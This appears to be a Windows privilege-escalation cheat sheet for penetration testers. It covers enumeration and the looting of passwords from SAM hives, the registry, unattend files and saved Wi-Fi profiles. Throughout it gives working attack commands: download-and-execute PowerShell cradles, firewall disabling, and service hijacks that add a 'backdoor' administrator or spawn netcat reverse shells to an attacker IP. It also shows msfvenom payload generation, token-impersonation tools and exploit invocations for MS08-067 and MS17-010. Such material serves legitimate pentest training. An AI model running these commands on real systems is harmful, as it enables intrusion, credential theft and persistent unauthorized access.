

## Tools

    PowerSploit’s PowerUp

      powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

    Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock
    BeRoot - Privilege Escalation Project - Windows / Linux / Mac

    Windows-Exploit-Suggester

      ./windows-exploit-suggester.py --update
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 

    windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems
    WindowsExploits - Windows exploits, mostly precompiled. Not being updated.
    WindowsEnum - A Powershell Privilege Escalation Enumeration Script.
    Seatbelt - A C# project that performs a number of security oriented host-survey “safety checks” relevant from both offensive and defensive security perspectives.
    Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind
    JAWS - Just Another Windows (Enum) Script

      powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

## Summary

    Tools
    Windows Version and Configuration
    User Enumeration
    Network Enumeration
    EoP - Looting for passwords
    EoP - Processes Enumeration and Tasks
    EoP - Incorrect permissions in services
    EoP - Windows Subsystem for Linux (WSL)
    EoP - Unquoted Service Paths
    EoP - Kernel Exploitation
    EoP - AlwaysInstallElevated
    EoP - Insecure GUI apps
    EoP - Runas
    EoP - From local administrator to NT SYSTEM
    EoP - Living Off The Land Binaries and Scripts
    EoP - Impersonation Privileges
        Meterpreter getsystem and alternatives
        RottenPotato (Token Impersonation)
        Juicy Potato (abusing the golden privileges)
    EoP - Common Vulnerabilities and Exposures
        MS08-067 (NetAPI)
        MS10-015 (KiTrap0D)
        MS11-080 (adf.sys)
        MS15-051 (Client Copy Image)
        MS16-032
        MS17-010 (Eternal Blue)
    References

#### Windows Version and Configuration

    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

#### Extract patchs and updates

    wmic qfe

#### Architecture

    wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%

#### List all env variables

    set
    Get-ChildItem Env: | ft Key,Value

#### List all drives

    wmic logicaldisk get caption || fsutil fsinfo drives
    wmic logicaldisk get caption,description,providername
    Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

#### User Enumeration

    Get current username

    echo %USERNAME% || whoami
    $env:username

#### List user privilege

    whoami /priv

#### List all users

    net user
    whoami /all
    Get-LocalUser | ft Name,Enabled,LastLogon
    Get-ChildItem C:\Users -Force | select Name

#### List logon requirements; useable for bruteforcing

    net accounts

#### Get details about a user (i.e. administrator, admin, current user)

    net user administrator
    net user admin
    net user %USERNAME%

#### List all local groups

    net localgroup
    Get-LocalGroup | ft Name

#### Get details about a group (i.e. administrators)

    net localgroup administrators
    Get-LocalGroupMember Administrators | ft Name, PrincipalSource
    Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource

#### Network Enumeration

List all network interfaces, IP, and DNS.

    ipconfig /all
    Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
    Get-DnsClientServerAddress -AddressFamily IPv4 | ft

#### List current routing table

    route print
    Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex

#### List the ARP table

    arp -A
    Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

#### List all current connections

    netstat -ano

    List firewall state and current configuration

    netsh advfirewall firewall dump

or 

    netsh firewall show state
    netsh firewall show config

#### List firewall’s blocked ports

    $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports

    Disable firewall

    netsh firewall set opmode disable
    netsh advfirewall set allprofiles state off

#### List all network shares

    net share

#### SNMP Configuration

    reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
    Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

#### Looting for passwords
######  SAM and SYSTEM files

######  The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.

#### Usually %SYSTEMROOT% = C:\Windows

    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system

#### Generate a hash file for John using pwdump or samdump2.

    pwdump SYSTEM SAM > /root/sam.txt
    samdump2 SYSTEM SAM -o sam.txt

######  Then crack it with john -format=NT /root/sam.txt.
#### Search for file contents

    cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
    findstr /si password *.xml *.ini *.txt *.config
    findstr /spin "password" *.*

#### Search for a file with a certain filename

    dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
    where /R C:\ user.txt
    where /R C:\ *.ini

#### Search the registry for key names and passwords

    REG QUERY HKLM /F "password" /t REG_SZ /S /K
    REG QUERY HKCU /F "password" /t REG_SZ /S /K

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
    reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

#### Read a value of a certain sub key

    REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList

#### Passwords in unattend.xml

######  Location of the unattend.xml files.

    C:\unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

######  Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul.

######  Example content

    <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
        <AutoLogon>
         <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
         <Enabled>true</Enabled>
         <Username>Administrateur</Username>
        </AutoLogon>

        <UserAccounts>
         <LocalAccounts>
          <LocalAccount wcm:action="add">
           <Password>*SENSITIVE*DATA*DELETED*</Password>
           <Group>administrators;users</Group>
           <Name>Administrateur</Name>
          </LocalAccount>
         </LocalAccounts>
        </UserAccounts>

#### Unattend credentials are stored in base64 and can be decoded manually with base64.

    $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
    SecretSecurePassword1234*

    The Metasploit module post/windows/gather/enum_unattend looks for these files.
    IIS Web config

    Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    C:\inetpub\wwwroot\web.config

#### Other files

    %SYSTEMDRIVE%\pagefile.sys
    %WINDIR%\debug\NetSetup.log
    %WINDIR%\repair\sam
    %WINDIR%\repair\system
    %WINDIR%\repair\software, %WINDIR%\repair\security
    %WINDIR%\iis6.log
    %WINDIR%\system32\config\AppEvent.Evt
    %WINDIR%\system32\config\SecEvent.Evt
    %WINDIR%\system32\config\default.sav
    %WINDIR%\system32\config\security.sav
    %WINDIR%\system32\config\software.sav
    %WINDIR%\system32\config\system.sav
    %WINDIR%\system32\CCM\logs\*.log
    %USERPROFILE%\ntuser.dat
    %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
    %WINDIR%\System32\drivers\etc\hosts
    dir c:*vnc.ini /s /b
    dir c:*ultravnc.ini /s /b

#### Wifi passwords

    Find AP SSID

    netsh wlan show profile

#### Get Cleartext Pass

    netsh wlan show profile <SSID> key=clear

#### Oneliner method to extract wifi passwords from all the access point.

    cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on

#### Passwords stored in services

######  Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher

    https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
    Import-Module path\to\SessionGopher.ps1;
    Invoke-SessionGopher -AllDomain -o
    Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

### Processes Enumeration and Tasks

####### What processes are running?

    tasklist /v
    net start
    sc query
    Get-Service
    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#### Which processes are running as “system”

    tasklist /v /fi "username eq system"

#### Do you have powershell magic?

    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion

#### List installed programs

    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name

#### List services

    net start
    wmic service list brief
    tasklist /SVC

#### Scheduled tasks

    schtasks /query /fo LIST 2>nul | findstr TaskName
    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#### Startup tasks

    wmic startup get caption,command
    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

#### Incorrect permissions in services

    A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.

#### Often, services are pointing to writeable locations:

    Orphaned installs, not installed anymore but still exist in startup
    DLL Hijacking
    PATH directories with weak permissions

    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
    FOR /F %i in (Servicenames.txt) DO echo %i
    type Servicenames.txt
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

#### Note to check file permissions you can use cacls and icacls

    icacls (Windows Vista +)
    cacls (Windows XP)

#### You are looking for BUILTIN\Users:(F)(Full access), BUILTIN\Users:(M)(Modify access) or BUILTIN\Users:(W)(Write-only access) in the output.
Example with Windows XP SP1

####  NOTE: spaces are mandatory for this exploit to work !
    sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe"
    sc config upnphost obj= ".\LocalSystem" password= ""
    sc qc upnphost
    sc config upnphost depend= ""
    net start upnphost

#### If it fails because of a missing dependency, try the following commands.

    sc config SSDPSRV start=auto
    net start SSDPSRV
    net stop upnphost
    net start upnphost

    sc config upnphost depend=""

    Using accesschk from Sysinternals or accesschk-XP.exe - github.com/phackt

    $ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
    RW SSDPSRV
            SERVICE_ALL_ACCESS
    RW upnphost
            SERVICE_ALL_ACCESS

    $ accesschk.exe -ucqv upnphost
    upnphost
      RW NT AUTHORITY\SYSTEM
            SERVICE_ALL_ACCESS
      RW BUILTIN\Administrators
            SERVICE_ALL_ACCESS
      RW NT AUTHORITY\Authenticated Users
            SERVICE_ALL_ACCESS
      RW BUILTIN\Power Users
            SERVICE_ALL_ACCESS

    $ sc config <vuln-service> binpath="net user backdoor backdoor123 /add"
    $ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    $ sc stop <vuln-service>
    $ sc start <vuln-service>
    $ sc config <vuln-service> binpath="net localgroup Administrators backdoor /add"
    $ sc stop <vuln-service>
    $ sc start <vuln-service>

#### Windows Subsystem for Linux (WSL)

#### Technique borrowed from Warlockobama’s tweet

    With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don’t know the root password? No problem just set the default user to root W/ .exe --default-user root. Now start your bind shell or reverse.

    wsl whoami
    ./ubuntun1604.exe config --default-user root
    wsl whoami
    wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'

#### Binary bash.exe can also be found in C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe

##### Alternatively you can explore the WSL filesystem in the folder C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
#### Unquoted Service Paths

    The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

    Metasploit provides the exploit : exploit/windows/local/trusted_service_path
    Example

    For C:\Program Files\something\legit.exe, Windows will try the following paths first:

        C:\Program.exe
        C:\Program Files.exe

#### Kernel Exploitation

#### List of exploits kernel : https://github.com/SecWiki/windows-kernel-exploits
    #Security Bulletin   #KB     #Description    #Operating System

        MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
        CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
        CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
        CVE-2018-0833 [SMBv3 Null Pointer Dereference Denial of Service] (Windows 8.1/Server 2012 R2)
        CVE-2018-8120 [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)
        MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
        MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
        MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
        MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)
        MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)
        MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)
        MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)
        MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)
        MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)
        …
        MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)

#### To cross compile a program from Kali, use the following command.

    Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c

#### AlwaysInstallElevated

####### Check if these registry values are set to “1”.

    $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

###### Then create an MSI package and install it.

    $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
    $ msiexec /quiet /qn /i C:\evil.msi

###### Use the cmdkey to list the stored credentials on the machine.

    cmdkey /list
    Currently stored credentials:
     Target: Domain:interactive=WORKGROUP\Administrator
     Type: Domain Password
     User: WORKGROUP\Administrator

###### Then you can use runas with the /savecred options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

    runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

#### runas with a provided set of credential.

    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"

    $ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
    $ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
    $ computer = "<hostname>"
    [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

#### From local administrator to NT SYSTEM

    PsExec.exe -i -s cmd.exe

#### Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/

    The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.

A LOLBin/Lib/Script must:

    Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra “unexpected” functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses
    Have functionality that would be useful to an APT or red team

      wmic.exe process call create calc
      regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
      Microsoft.Workflow.Compiler.exe tests.xml results.xml

#### RottenPotato (Token Impersonation)

Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG

      getuid
      getprivs
      use incognito
      list\_tokens -u
      cd c:\temp\
      execute -Hc -f ./rot.exe
      impersonate\_token "NT AUTHORITY\SYSTEM"

      Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
      Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
      Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"

#### Juicy Potato (abusing the golden privileges)

Binary available at : https://github.com/ohpe/juicy-potato/releases
:warning: Juicy Potato doesn’t work in Windows Server 2019.

    Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)

     whoami /priv

    Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
        Windows 7 Enterprise
        Windows 8.1 Enterprise
        Windows 10 Enterprise
        Windows 10 Professional
        Windows Server 2008 R2 Enterprise
        Windows Server 2012 Datacenter
        Windows Server 2016 Standard

    Execute JuicyPotato to run a privileged command.

     JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
     JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
     JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
         Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
         ......
         [+] authresult 0
         {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
         [+] CreateProcessWithTokenW OK

#### Common Vulnerabilities and Exposure

#### MS08-067 (NetAPI)

###### Check the vulnerability with the following nmap script.

      nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms08-067 <ip_netblock>

      https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
      msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows

      Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
      Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
      Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
      Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
      Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
      Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
      Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)
      python ms08-067.py 10.0.0.1 6 445

#### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7

#### ‘KiTrap0D’ User Mode to Ring Escalation (MS10-015)

    https://www.exploit-db.com/exploits/11199

    Metasploit : exploit/windows/local/ms10_015_kitrap0d

#### MS11-080 (afd.sys) - Microsoft Windows XP/2003

    Python: https://www.exploit-db.com/exploits/18176
    Metasploit: exploit/windows/local/ms11_080_afdjoinleaf

#### MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012

    printf("[#] usage: ms15-051 command \n");
    printf("[#] eg: ms15-051 \"whoami /all\" \n");

#### x32

https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe

####  x64

https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
use exploit/windows/local/ms15_051_client_copy_image

#### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)

###### Check if the patch is installed : wmic qfe list | findstr "3139914"

######  Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

#### MS17-010 (Eternal Blue)

########  Check the vulnerability with the following nmap script.

      nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>
      git clone https://github.com/helviojunior/MS17-010

########  generate a simple reverse shell to use
      msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe
      python2 send_and_execute.py 10.0.0.1 revshell.exe

#### References
- Source : [0x1 gitlab Win Priv Esc](https://0x1.gitlab.io/exploit/Windows-Privilege-Escalation/)
